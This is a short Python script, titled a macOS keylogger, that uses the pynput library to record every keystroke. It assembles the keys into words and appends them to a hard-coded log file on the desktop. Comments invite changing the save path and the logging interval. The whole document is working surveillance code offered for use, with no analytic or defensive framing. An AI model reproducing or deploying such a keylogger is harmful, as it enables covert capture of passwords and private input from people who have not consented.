#MacOS keylogger
import pynput
from pynput.keyboard import Key, Listener

wordcount = 0
word = ''
log = ''

# Where to save key logs you, you can change it to wherever
logs = open("/Users/emin/Desktop/logs.txt", "a")

def on_press(key):
    
    global wordcount
    global word
    global log
    nkey = ''
    
    if key == Key.space:
        word += " "
        wordcount += 1
        log += word
        word = ""
    elif key == Key.enter:
        word += " "
        wordcount += 1
        log += word
        word = ""
    elif key == Key.backspace:
        word = word[:-1]
    else:        
        nkey = str(key)
        nkey = nkey[1:-1]
        word = word + nkey
def on_release(key):
    global logs
    global wordcount
    #Change the if statement to write logs at an interval you desire
    if wordcount >= 10:
        logs.write(log)
        logs.close()
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
